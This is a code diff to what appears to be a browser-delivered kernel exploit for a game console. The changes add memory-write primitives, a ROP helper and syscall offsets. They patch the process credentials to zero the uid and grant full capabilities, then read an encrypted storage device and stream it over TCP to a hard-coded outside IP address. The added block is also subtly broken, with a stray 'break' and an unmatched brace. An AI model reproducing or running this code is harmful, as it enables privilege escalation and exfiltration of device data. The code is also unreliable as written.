@@ -229,6 +229,26 @@ function setupRW() {
 			master_b[0] = og_slave_addr.low;
 			master_b[1] = og_slave_addr.hi;
 		},
+		write2: function(addr, val) {
+			master_b[0] = addr.low;
+			master_b[1] = addr.hi;
+
+			let tmp_val = slave_b[0] & 0xFFFF0000;
+			slave_b[0] = tmp_val | (val & 0xFFFF);
+
+			master_b[0] = og_slave_addr.low;
+			master_b[1] = og_slave_addr.hi;
+		},
+		write1: function(addr, val) {
+			master_b[0] = addr.low;
+			master_b[1] = addr.hi;
+
+			let tmp_val = slave_b[0] & 0xFFFFFF00;
+			slave_b[0] = tmp_val | (val & 0xFF);
+
+			master_b[0] = og_slave_addr.low;
+			master_b[1] = og_slave_addr.hi;
+		},
 		read8: function(addr) {
 			master_b[0] = addr.low;
 			master_b[1] = addr.hi;
@@ -718,7 +738,9 @@ function stage2() {
   var countbytes;
   //alert("before syscalls");
 
+  window.syscalls[3] = window.libKernelBase.add32(0x322d0);//write
   window.syscalls[4] = window.libKernelBase.add32(0x30c90);//write
+  window.syscalls[5] = window.libKernelBase.add32(0x300d0);//open
   window.syscalls[20] = window.libKernelBase.add32(0x31c30);//getpid
   window.syscalls[23] = window.libKernelBase.add32(0x2fd50);//setuid
   window.syscalls[54] = window.libKernelBase.add32(0x30110);//ioctl
@@ -826,7 +848,8 @@ function stage2() {
 }
 
 function stage3() {
-
+  const AF_INET = 2;
+  const SOCK_STREAM  = 1;
   const AF_INET6 = 28;
   const SOCK_DGRAM = 2;
   const IPPROTO_UDP = 17;
@@ -858,9 +881,12 @@ function stage3() {
   const KERNEL_ALLPROC_OFFSET = 0x3851B48;//match
   const KERNEL_PMAP_STORE_OFFSET = 0x4096198;//match
 
-  const NUM_SPRAY_SOCKS = 200;
-  const NUM_LEAK_SOCKS = 200;
+  const NUM_SPRAY_SOCKS = 99;//i've got 99 sockets but the bitch ain't one
+  const NUM_LEAK_SOCKS = 99;
   const NUM_SLAVE_SOCKS = 300;
+  
+  let dump_sock_fd = chain.syscall(0x061, AF_INET, SOCK_STREAM, 0);
+  alert("opened dump sock=0x" + dump_sock_fd);
 
   const size_of_triggered = 0x8;
   const size_of_valid_pktopts = 0x18;
@@ -1242,7 +1268,7 @@ function stage3() {
   const proc = find_proc();
   const proc_ucred = kernel_read8(proc.add32(PROC_UCRED_OFFSET));
   
-  alert("here we go!");
+  //alert("here we go!");
   
   // dump code (slow) - specter
   function htons(port) {
@@ -1265,7 +1291,7 @@ function stage3() {
     p.write4(buf.add32(0x04), addr);
   }
 
-  const DUMP_NET_IP   = "89.181.169.194"; // edit this
+  const DUMP_NET_IP   = "89.181.169.194"; // edit this, mr SocraticBliss
   let DUMP_NET_ADDR = aton(DUMP_NET_IP); 
   let DUMP_NET_PORT = htons(5656);
 
@@ -1273,35 +1299,63 @@ function stage3() {
   let dump_sock_send_sz_store = p.malloc(0x4);
   let dump_sock_connected     = 0;
 
-  let dump_sock_fd = chain.syscall(0x061, AF_INET, SOCK_STREAM, 0);
-  alert("opened dump sock=0x" + dump_sock_fd);
+
 
   for (let i = 0; i < 0x10; i += 0x8) {
     p.write8(dump_sock_addr_store.add32(i), 0);
   }
 
   build_addr(dump_sock_addr_store, AF_INET, DUMP_NET_PORT, DUMP_NET_ADDR);
+  
+  let uid_store_across     	= p.malloc(0x8);
+  let authid_store  		= p.malloc(0x8);
+  let caps_store    		= p.malloc(0x8);
+  
+  p.write8(uid_store_across, new int64(0x00000000, 0x00000000));
+  p.write8(authid_store, new int64(0x00000010, 0x48000000));
+  p.write8(caps_store, new int64(0xffffffff, 0xffffffff));
 
-  let dump_addr = kernel_base;
-  let dump_page = p.malloc(0x1000);
+  // Patch creds
+  kernel_write8(proc_ucred.add32(0x04), uid_store_across);// cr_uid, cr_ruid
+  kernel_write8(proc_ucred.add32(0x58), authid_store);//checked, cr_sceAuthID
+  kernel_write8(proc_ucred.add32(0x60), caps_store);//checked, cr_sceCaps[0]
+  kernel_write8(proc_ucred.add32(0x68), caps_store);//checked, cr_sceCaps[1]
 
-  alert("about to dump kernel (0x" + dump_addr + "), ensure dump server is running (" + DUMP_NET_IP + ":5656)...");
 
-  let connect_res = chain.syscall(0x062, dump_sock_fd, dump_sock_addr_store, 0x10);
+  const buf_size = 0x4000;
+  let buf = p.malloc(buf_size);
+  let fd = chain.syscall(0x005,"/dev/da0x12.crypt", 0);//open
+  if(fd.low == 0xffffffff){
+		alert("failed to open, error -1");
+		break;
+	}
+	else{
+		alert("opened successfully, 0x" + fd);
+	}
+  }
+  alert("/dev/da0x12.crypt opened? 0x" + fd);
+
+  let connect_res = chain.syscall(0x062, dump_sock_fd, dump_sock_addr_store, 0x10);//connect
   alert("connected dump sock? 0x" + connect_res);
 
   for (let pfn = 0; ; pfn++) {
-    for (let off = 0; off < 0x1000; off += 0x8) {
-      let qword = kernel_read8(kernel_base.add32((pfn * 0x1000) + off));
-      p.write8(dump_page.add32(off), qword);
-    }
-
-    
-    let write_res = chain.syscall(0x004, dump_sock_fd, dump_page, 0x1000);
-    if (pfn == 0)
-      alert("first page written? 0x" + write_res);
+      let read = chain.syscall(0x003, fd, buf, buf_size);//read
+	  if(read.low == 0xffffffff){
+		  alert("failed to read, error -1");
+		  break;
+	  }
+	  else{
+		alert("read successfully, 0x" + read);
+	  }
+	  let write = chain.syscall(0x004, dump_sock_fd, buf, buf_size);//write
+	  if(write.low == 0xffffffff){
+		  alert("failed to write, error -1");
+		  break;
+	  }
+	  else{
+		alert("written successfully, 0x" + write);
+	  }
   }
-
   // end dump code
   
 /*
@@ -1488,6 +1542,14 @@ window.rop = function () {
     this.push(what);
     this.push(gadgets["mov [rdi], rsi"]);
   }
+  
+  this.push_write4 = function (where, what) {
+        this.push(gadgets["pop rdi"]);
+        this.push(where);
+        this.push(gadgets["pop rax"]);
+        this.push(what);
+        this.push(gadgets["mov [rdi], eax"]);
+   }
 
   this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
     if (rdi != undefined) {
